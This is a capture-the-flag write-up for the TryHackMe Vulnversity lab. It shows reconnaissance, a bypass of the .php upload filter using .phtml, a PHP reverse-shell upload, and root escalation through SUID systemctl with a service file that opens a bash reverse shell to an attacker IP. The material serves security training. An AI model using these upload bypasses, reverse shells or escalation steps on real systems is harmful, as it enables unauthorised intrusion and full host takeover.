---
layout: post
title: TryHackMe - Vulnversity
---

This is a writeup for Vulnversity on [TryHackMe](https://tryhackme.com/room/vulnversity).

## Reconnaissance

```bash
root@kali:~/TryHackMe/vulnversity# nmap -sV 10.10.149.14
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-12 20:04 EDT
Nmap scan report for 10.10.149.14
Host is up (0.16s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.19 seconds
```

* Scan the box, how many ports are open?
	* 6
* What version of the squid proxy is running on the machine?
	* 3.5.12
* How many ports will nmap scan if the flag -p-400 was used?
	* 400
* Using the nmap flag -n what will it not resolve?
	* DNS
* What is the most likely operating system this machine is running?
	* Ubuntu
* What port is the web server running on?
	* 3333

> Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don't forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background)

## Locating directories using GoBuster

```bash
root@kali:~/TryHackMe/vulnversity# gobuster dir -u http://10.10.149.14:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.149.14:3333
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/12 20:20:02 Starting gobuster
===============================================================
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/internal (Status: 301)
Progress: 9871 / 220561 (4.48%)
```

* What is the directory that has an upload form page?
	* `/internal/`

## Compromise the webserver
With a form to upload files, we can upload and execute our payload that will lead to compromising the web server.

* Try upload a few file types to the server, what common extension seems to be blocked?
	* .php

We have an upload form that blocks .php extensions. Let's see if we can get around that. First, catch a request to upload a file in Burp Suite. Use Action->Send to Intruder. Set the IP and port in the Attack Target menu under Intruder. Set up the Payload Positions like so, with the attack type of Sniper:
```
POST /internal/index.php HTTP/1.1
Host: 10.10.149.14:3333
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.149.14:3333/internal/index.php

Content-Type: multipart/form-data; boundary=---------------------------6074011111607751422717811685
Content-Length: 54530
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------6074011111607751422717811685
Content-Disposition: form-data; name="file"; filename="shell§.php§"
Content-Type: application/x-php


-----------------------------6074011111607751422717811685
Content-Disposition: form-data; name="submit"

§Submit§
-----------------------------6074011111607751422717811685--
```


For Intruder in Burp Suite, we make a wordlist with php extensions and then load it into the Payloads' simple list table. Make sure to not encode characters as HTML, or put the period outside the payload.
```bash
root@kali:~/TryHackMe/vulnversity# cat phpext.txt 
.php
.php3
.php4
.php5
.phtml
```

* Run a Burp Intruder Sniper attack. Which extension is allowed?
	* .phtml

Burp tells us that .phtml is an allowed format. Let's make php-reverse-shell.phtml from the standard pentestmonkey reverse shell script on GitHub, replacing the default ip with our output from `ifconfig tun0`.

## Gaining a Foothold

Start a listener like `nc -lvnp 1234` and upload the file. Then, navigate to `http://10.10.149.14:3333/internal/uploads/php-reverse-shell.phtml` and you should get a shell. Check who lives there and find the user flag.

```bash
root@kali:~/TryHackMe/vulnversity# nc -lvnp 1234
listening on [any] 1234 
...
$ whoami
www-data
$ ls /home
bill
$ ls /home/bill
user.txt
$ cat /home/bill/user.txt
8bd7992f8{censored}a261004cfcedb
```

* What is the name of the user who manages the webserver?
	* bill (check `/home`)
* What is the user flag?
	* 8bd7992f8{censored}a261004cfcedb

## Privilege Escalation

Do we have an SUID misconfiguration?

```
$ find / -user root -perm -4000 -exec ls - ldb {} \; 2>/dev/null
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
```

To use a misconfigured systemctl, we need to find a writable directory ([REF](https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49)). As www-data, we go to `/var/www/html/`. We then create a file called `root.service`.

```
$ cd /var/www/html # www-data has permission to create files here
$ echo "[Unit] 
> Description=rooot
> 
> [Service]
> Type=simple
> User=root
> ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.8.20.137/9999 0>&1'
> 
> [Install]
> WantedBy=multi-user.target
> " > root.service
```

> It’s important to make sure that the User value is set to the user you want systemctl to execute the service as. In this case, I set this value to root because my goal is to obtain a root level shell. The ExecStart parameter is where we need to place our payload. In this case, I am using a one-line bash reverse shell.

```
$ cat root.service
[Unit]
Description=rooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.8.20.137/9999 0>&1'

[Install]
WantedBy=multi-user.target

$ systemctl enable $(pwd)/root.service
Created symlink from /etc/systemd/system/multi-user.target.wants/root.service to /var/www/html/root.service.
Created symlink from /etc/systemd/system/root.service to /var/www/html/root.service.
$ systemctl start root
```

Attacker's listener:

```
root@kali:~/TryHackMe/vulnversity# nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.8.20.137] from (UNKNOWN) [10.10.149.14] 38812
bash: cannot set terminal process group (2181): Inappropriate ioctl for device
bash: no job control in this shell
root@vulnuniversity:/# ls /root
ls /root
root.txt
root@vulnuniversity:/# cat /root/root.txt
cat /root/root.txt
a58ff8579f{censored}33a9966c7fd5
```